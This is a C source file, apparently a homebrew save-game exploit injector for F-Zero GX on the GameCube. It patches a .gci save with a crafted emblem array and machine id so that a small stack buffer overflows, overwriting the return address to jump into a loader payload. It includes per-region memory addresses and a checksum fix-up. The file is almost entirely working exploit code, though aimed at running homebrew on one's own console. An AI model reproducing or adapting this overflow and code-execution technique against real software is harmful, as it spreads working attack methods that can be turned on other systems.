// Copyright 2018 FIX94
// This code is licensed to you under the terms of the GNU GPL, version 2;
// see file LICENSE or http://www.gnu.org/licenses/old-licenses/gpl-2.0.txt

#include <stdio.h>
#include <inttypes.h>
#include <malloc.h>
#include "bnr.h"

static void write_16bit(uint8_t *buf, uint16_t val)
{
	buf[0] = (val>>8)&0xFF;
	buf[1] = val&0xFF;
}
static void write_32bit(uint8_t *buf, uint32_t val)
{
	buf[0] = (val>>24)&0xFF;
	buf[1] = (val>>16)&0xFF;
	buf[2] = (val>>8)&0xFF;
	buf[3] = val&0xFF;
}

static void write_save_byte(uint8_t *buf, uint8_t byte, uint8_t shift)
{
	uint8_t i, bpos = 0;
	for(i = 0; i < 8; i++)
	{
		if(byte&(0x80>>i))
			buf[bpos] |= (1<<shift);
		else
			buf[bpos] &= ~(1<<shift);
		shift++;
		if(shift >= 8)
		{
			shift = 0;
			bpos++;
		}
	}
}
static uint8_t emblem_arr[0x2000];

int main(int argc, char *argv[])
{
	if(argc < 2)
	{
		printf("too few arguments!\n");
		return 0;
	}
	if(strlen(argv[1]) > 4)
	{
		printf("too long region id %s!\n", argv[1]);
		return 0;
	}
	uint32_t emblem_arr_start;
	uint32_t machine_id_arr_start;
	uint32_t machine_id;
	if(strcmp(argv[1],"gfze") == 0)
	{
		emblem_arr_start = 0x801B5670;
		machine_id_arr_start = 0x801B67B0;
		machine_id = 0x9C;
		//for reference
		//get_machine_id_name = 0x803094F0
		//copy_machine_id_string = 0x8030A8C4
		//machine_id_name_arr = 0x8032423C
	}
	else if(strcmp(argv[1],"gfzj") == 0)
	{
		emblem_arr_start = 0x801B4EF0;
		machine_id_arr_start = 0x801B6150;
		machine_id = 0x90;
		//for reference
		//get_machine_id_name = 0x8030812C
		//copy_machine_id_string = 0x80309500
		//machine_id_name_arr = 0x80322B14
	}
	else if(strcmp(argv[1],"gfzp") == 0)
	{
		emblem_arr_start = 0x801B8BA0;
		machine_id_arr_start = 0x801B9CF0;
		machine_id = 0x9B;
		//for reference
		//get_machine_id_name = 0x8030E520
		//copy_machine_id_string = 0x8030F8F4
		//machine_id_name_arr = 0x8032974C
	}
	else
	{
		printf("Unknown region id %s!\n", argv[1]);
		return 0;
	}
	printf("injecting exploit into %s\n", argv[1]);
	uint32_t memdest = machine_id_arr_start+(machine_id*0x18);
	if(memdest < emblem_arr_start)
	{
		printf("Selected machine id array is below emblem array!\n");
		return 0;
	}
	else if(memdest+0x18 >= emblem_arr_start+0x2000)
	{
		printf("Selected machine id array is above emblem array!\n");
		return 0;
	}
	char name[64];
	sprintf(name,"%s.ori",argv[1]);
	FILE *f = fopen(name, "rb");
	if(!f)
	{
		printf("Could not open base .gci!\n");
		return 0;
	}
	fseek(f,0,SEEK_END);
	size_t fsize = ftell(f);
	if(fsize < 0xC040)
	{
		printf("Base .gci too small!\n");
		fclose(f);
		return 0;
	}
	uint8_t *buf = malloc(fsize);
	rewind(f);
	fread(buf,1,fsize,f);
	fclose(f);
	f = NULL;
	size_t i,j;
	//write in custom comment
	memset(buf+0x64,0,0x10);
	strcpy((char*)(buf+0x64),"Game Exploit");
	//write in custom banner
	for(i = 0; i < 3072; i++)
		write_16bit(buf+0xA0+(i<<1),bnr_bin[i]);
	uint16_t dest = memdest-emblem_arr_start;
	printf("setting machine id to %i so name loads from emblem_arr[3]+0x%04x (0x%08x)\n", machine_id, dest, memdest);
	//this write into the machine id slot of the custom machine will trigger the exploit
	write_save_byte(buf+0xA253, machine_id, 5);
	//make it easy to debug
	//memset(emblem_arr,machine_id,0x2000);
	//the function get_machine_id_name copies machine_id_name_arr onto the stack at machine_id_arr_start,
	//and when the game reads that array back from stack, parts of emblem_arr[3] are still left over
	//very close by, so we just modify the machine id to point us right into it, where we set
	//the actual name pointer that copy_machine_id_string uses to emblem_arr_start instead of a valid name
	write_32bit(emblem_arr+dest+0x00,emblem_arr_start);
	write_32bit(emblem_arr+dest+0x04,emblem_arr_start);
	write_32bit(emblem_arr+dest+0x08,emblem_arr_start);
	write_32bit(emblem_arr+dest+0x0C,emblem_arr_start);
	write_32bit(emblem_arr+dest+0x10,emblem_arr_start);
	write_32bit(emblem_arr+dest+0x14,emblem_arr_start);
	//the stack copy_machine_id_string allocates is very small so we can easily overflow it and get code
	//execution, it just takes 0x4C bytes to get to the function return pointer so we can jump anywhere
	memset(emblem_arr,0x11,0x4C);
	//so now writing our address of choice into emblem_arr+0x4C will make the game jump to it at the end
	//of copy_machine_id_string, so let us jump right to emblem_arr+0x50 where we can put our code
	write_32bit(emblem_arr+0x4C,emblem_arr_start+0x50);
	//now to fill up emblem_arr with some actual code!
	sprintf(name,"%s.dat",argv[1]);
	f = fopen(name,"rb");
	if(!f)
	{
		printf("Could not open loader file!\n");
		free(buf);
		return 0;
	}
	fseek(f,0,SEEK_END);
	size_t ldrsize = ftell(f);
	if(ldrsize >= 0xF00)
	{
		printf("Loader file too big!\n");
		fclose(f);
		free(buf);
		return 0;
	}
	rewind(f);
	//write it right to where we pointed earlier
	fread(emblem_arr+0x50,1,ldrsize,f);
	fclose(f);
	f = NULL;
	//save our hacked up emblem array, ready to be triggered
	for(i = 0; i < 0x2000; i++)
		write_save_byte(buf+0x824F+i, emblem_arr[i], 5);
	//fix up checksum and thats it
	uint16_t chk = 0xFFFF;
	for(i = 0x42; i < fsize; i++)
	{
		chk^=buf[i];
		for(j = 0; j < 8; j++)
		{
			if(chk&1)
				chk = (chk>>1)^0x8408;
			else
				chk>>=1;
		}
	}
	chk^=0xFFFF;
	uint8_t b1 = (chk>>8)&0xFF;
	uint8_t b2 = chk&0xFF;
	buf[0x40] = b1; buf[0x41] = b2;
	//write into output .gci
	sprintf(name,"%s.gci",argv[1]);
	f = fopen(name, "wb");
	if(f)
	{
		fwrite(buf,1,fsize,f);
		fclose(f);
		f = NULL;
	}
	else
		printf("Could not open output .gci!\n");
	free(buf);
	return 0;
}
